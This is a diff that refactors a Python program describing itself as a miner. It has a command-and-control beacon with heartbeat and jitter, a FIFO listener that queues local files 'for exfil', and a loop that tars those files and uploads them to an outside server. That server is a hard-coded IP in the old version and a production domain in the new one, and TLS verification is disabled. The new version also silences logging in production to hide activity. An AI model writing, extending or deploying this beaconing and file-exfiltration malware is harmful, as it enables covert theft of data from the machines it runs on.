@@ -4,98 +4,99 @@ import hashlib
 import string
 import time
 import requests
+import json
+import logging
+import os
+import tarfile
+import threading
 from random import choice, randint
 from collections import deque
-import tarfile
-import os
-import threading
-import json
 import urllib3
+import select
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-# below value should be 0 (CPU @ ~20%) or 1 (CPU quiet, slows payoff)
-target = 3000000000000000000000000000000000000000000000  # just for testing
+# ========== CONFIG ==========
+ENV = os.environ.get("ENV", "DEV").upper()
+CONFIG = {
+    "DEV": {
+        "BASE_URL": "http://localhost:8443/healthcheck",
+    },
+    "PROD": {
+        "BASE_URL": "https://watchdawgz.com/healthcheck",
+    },
+}[ENV]
 
-
-global processingLevel
-processingLevel = 0.1  # time to sleep between hashes (in seconds)
-
-PIPE = "/tmp/fifo"  # FIFO path for file exfiltration
+TARGET = 3 * 10**45  # Target difficulty
+PROCESSING_DELAY = 0.1  # Delay per hash
+FIFO_PATH = "/tmp/fifo"
+logger = logging.getLogger("Miner")
+if ENV == "DEV":
+    logging.basicConfig(level=logging.INFO)
+else:
+    logging.basicConfig(level=logging.CRITICAL)  # Suppresses INFO/WARNING/ERROR
+# ========== COMPONENTS ==========
 
 
 class PhoneHome:
-    heartbeat = 30
-    jitter = 15
-    # home_url = "https://localhost:8888/kk"
-    home_url = "https://104.53.222.47:443/healthcheck"
-
     def __init__(self):
-        super().__init__()
+        self.heartbeat = 30
+        self.jitter = 15
 
-    def CallHome(self, MinerID):  # heartbeat check-in with C2
-        payload = {"miner_id": MinerID}
+    def fetch_beacon_config(self, miner_id):
+        url_ext = "check/"
         try:
             r = requests.post(
-                self.home_url + "/check/",
-                json=payload,
-                verify=False,
+                f"{CONFIG['BASE_URL']}/{url_ext}", json={"miner_id": miner_id}
             )
-            if r.status_code != 200:
-                raise ValueError(r.json())
+            r.raise_for_status()
             p = r.json()
-            PhoneHome.heartbeat = p["h"]
-            PhoneHome.jitter = p["j"]
-        except ConnectionError as e:
-            print(f"Connection error: {e}")
-        except ValueError as e:
-            print(f"Value error: {e}")
+            self.heartbeat = p["h"]
+            self.jitter = p["j"]
+            logger.info(
+                f"[+] Updated heartbeat to {self.heartbeat}, jitter to {self.jitter}"
+            )
+        except Exception as e:
+            logger.error(f"[-] Failed beacon config fetch: {e}")
 
-    def CallCoin(self, CoinResult, MinerID):  # send a coin result to bank
-        payload = {"miner_id": MinerID, "coin_result": CoinResult}
-        requests.post(self.home_url + "/pass/", json=payload)
+    def submit_coin(self, coin_result, miner_id):
+        url_ext = "pass/"
+        try:
+            payload = {"kk": coin_result, "mid": miner_id}
+            r = requests.post(f"{CONFIG["BASE_URL"]}/{url_ext}", json=payload)
+            logger.info(f"[+] Submitted coin: {r.text}")
+        except Exception as e:
+            logger.error(f"[-] Failed to submit coin: {e}")
 
-    def NewTime(self):  # get the next C2 check-in time
-        current_time = datetime.datetime.now()
-        # add or subtract jitter
-        seed = randint(0, 1)
-        if seed == 0:
-            offset = PhoneHome.heartbeat - randint(0, PhoneHome.jitter)
-        else:
-            offset = PhoneHome.heartbeat + randint(0, PhoneHome.jitter)
-        # use offset to establish next check in
-        return_time = current_time + datetime.timedelta(seconds=offset)
-        return return_time
+    def get_next_checkin_time(self):
+        now = datetime.datetime.now()
+        offset = self.heartbeat + randint(0, self.jitter) * (
+            -1 if now.microsecond % 2 == 0 else 1
+        )
+        return now + datetime.timedelta(seconds=offset)
 
 
-class Coin:
-    def __init__(self, level):
-        self.processingLevel = level
+class CoinMiner:
+    def mine(self):
+        chars = string.ascii_letters + string.digits + string.punctuation
+        seed = "".join(choice(chars) for _ in range(randint(1, 20)))
+        digest = hashlib.sha1(seed.encode("utf-8"))
+        time.sleep(PROCESSING_DELAY)
+        return digest
 
-    def Mine(self):  # generate a random string and get its hash digest
-        allchar = string.ascii_letters + string.punctuation + string.digits
-        miningSeed = "".join(choice(allchar) for x in range(randint(1, 20)))
-        miningDigest = hashlib.sha1((miningSeed).encode("utf-8"))
-        time.sleep(self.processingLevel)
-        return miningDigest
-
-    def Compare(self, target, miningDigest):  # compare mining try to reference value
-        CoinTry = int(miningDigest.hexdigest(), miningDigest.digest_size)
-        if CoinTry < target:
-            result = 1
-        else:
-            result = 0
-        return result
+    def meets_target(self, digest):
+        value = int(digest.hexdigest(), digest.digest_size)
+        return value < TARGET
 
 
 class FileStack:
-    def __init__(self, idle_timeout=60):
+    def __init__(self, idle_timeout=10):
         self.stack = deque()
         self.last_activity = datetime.datetime.now()
         self.idle_timeout = idle_timeout
-        self.i = 0
+        self.counter = 0
 
-    def add_file(self, path):
+    def add(self, path):
         self.stack.append(path)
         self.last_activity = datetime.datetime.now()
 
@@ -104,91 +105,129 @@ class FileStack:
             datetime.datetime.now() - self.last_activity
         ).seconds > self.idle_timeout
 
-    def bundle_files(self, out_path="exfil.tar.gz"):
-        out_path = f"{self.i}" + out_path
-        with tarfile.open(out_path, "w:gz") as tar:
+    def bundle(self):
+        archive_name = f"{self.counter}_exfil.tar.gz"
+        with tarfile.open(archive_name, "w:gz") as tar:
             while self.stack:
                 f = self.stack.popleft()
                 if os.path.isfile(f):
                     tar.add(f, arcname=os.path.basename(f))
-        self.i += 1
-        return out_path
+        self.counter += 1
+        return archive_name
 
 
-file_buffer = FileStack(idle_timeout=10)
+file_stack = FileStack()
 
 
-def watch_and_bundle(mid):
-    while True:
+# ========== THREAD TARGETS ==========
+
+
+def mining_loop(miner_id, stop_event):
+    beacon = PhoneHome()
+    miner = CoinMiner()
+    beacon_time = datetime.datetime.now()
+
+    while not stop_event.is_set():
+        if datetime.datetime.now() >= beacon_time:
+            beacon.fetch_beacon_config(miner_id)
+            beacon_time = beacon.get_next_checkin_time()
+
+        digest = miner.mine()
+        if miner.meets_target(digest):
+            beacon.submit_coin(digest.hexdigest(), miner_id)
+
+
+def file_watcher_loop(miner_id, stop_event):
+    while not stop_event.is_set():
         time.sleep(5)
-        #       print("Checking for idle state...")
-        if file_buffer.is_idle() and file_buffer.stack:
-            archive = file_buffer.bundle_files()
-            #           print(f"Bundled files to {archive}, sending to server...")
+        if file_stack.is_idle() and file_stack.stack:
+            archive = file_stack.bundle()
             with open(archive, "rb") as f:
                 files = {
                     "upload": (archive, f, "application/gzip"),
-                    "metadata": (None, json.dumps({"uuid": mid})),
+                    "metadata": (None, json.dumps({"uuid": miner_id})),
                 }
-                requests.post(
-                    "https://104.53.222.47:8888/kk/update/",
-                    files=files,
-                    verify=False,
-                )
+                try:
+                    r = requests.post(
+                        f"{CONFIG['BASE_URL']}/update/",
+                        files=files,
+                        verify=False,
+                    )
+                    logger.info(
+                        f"[+] Uploaded archive: {archive} => {r.status_code}",
+                    )
+                except Exception as e:
+                    logger.error(f"[-] Failed archive upload: {e}")
             os.remove(archive)
 
 
-def fifo_listener(pipe_path, file_buffer):
-    #   print(f"[+] Starting FIFO listener on {pipe_path}")
-    if not os.path.exists(pipe_path):
-        os.mkfifo(pipe_path)
-        print(f"[+] FIFO created at {pipe_path}")
+def fifo_listener_loop(stop_event):
+    if not os.path.exists(FIFO_PATH):
+        os.mkfifo(FIFO_PATH)
+        logger.info(f"[+] Created FIFO at {FIFO_PATH}")
 
-    #   print(f"[+] Listening to FIFO at {pipe_path}")
-    while True:
-        with open(pipe_path, "r") as pipe:
-            for line in pipe:
-                filepath = line.strip()
-                if os.path.isfile(filepath):
-                    #                   print(f"[+] Marked for exfil: {filepath}")
-                    file_buffer.add_file(filepath)
+    fifo = open(FIFO_PATH, "r")
+    logger.info("[*] FIFO listener started.")
+
+    try:
+        while not stop_event.is_set():
+            rlist, _, _ = select.select([fifo], [], [], 1)
+            if fifo in rlist:
+                while True:
+                    line = fifo.readline()
+                    if not line:
+                        break  # end of current batch of input
+                    filepath = line.strip()
+                    if os.path.isfile(filepath):
+                        file_stack.add(filepath)
+                        logger.info(f"[+] Queued for exfil: {filepath}")
+                    else:
+                        logger.warning(f"[!] Ignored non-file path: {filepath}")
+    except Exception as e:
+        logger.error(f"[!] FIFO listener error: {e}")
+    finally:
+        fifo.close()
+        logger.info("[*] FIFO listener stopped.")
 
 
-#                else:
-#                   print(f"[-] Not a file or doesn't exist: {filepath}")
+# ========== MAIN ENTRY ==========
 
 
 def main():
-    GetNewParams = 1
-    app = PhoneHome()
-    MinerID = uuid.uuid4().hex
-    Mine = Coin(level=processingLevel)
-    threading.Thread(
-        target=watch_and_bundle,
-        args=(MinerID,),
-        daemon=True,
-    ).start()
-    threading.Thread(
-        target=fifo_listener,
-        args=(PIPE, file_buffer),
-        daemon=True,
-    ).start()
+    miner_id = uuid.uuid4().hex
+    stop_event = threading.Event()
 
-    while True:
-        checkpoint = datetime.datetime.now()
+    threads = [
+        threading.Thread(
+            target=mining_loop,
+            args=(miner_id, stop_event),
+            daemon=True,
+        ),
+        threading.Thread(
+            target=file_watcher_loop,
+            args=(miner_id, stop_event),
+            daemon=True,
+        ),
+        threading.Thread(
+            target=fifo_listener_loop,
+            args=(stop_event,),
+            daemon=True,
+        ),
+    ]
 
-        if GetNewParams == 1:
-            check_in = app.NewTime()
-            GetNewParams = 0
-            app.CallHome(str(MinerID))
+    for t in threads:
+        t.start()
 
-        if checkpoint > check_in:
-            GetNewParams = 1
-        else:
-            CoinResult = Mine.Mine()
-
-        if Mine.Compare(target, CoinResult) == 1:
-            app.CallCoin(CoinResult.hexdigest(), MinerID)
+    logger.info(f"[*] Miner started with ID: {miner_id}")
+    try:
+        while any(t.is_alive() for t in threads):
+            time.sleep(0.5)
+    except KeyboardInterrupt:
+        logger.info("[!] Shutdown signal received. Cleaning up...")
+        stop_event.set()
+        for t in threads:
+            t.join(timeout=5)  # optional timeout
+        logger.info("[+] All threads shut down cleanly.")
 
 
 if __name__ == "__main__":
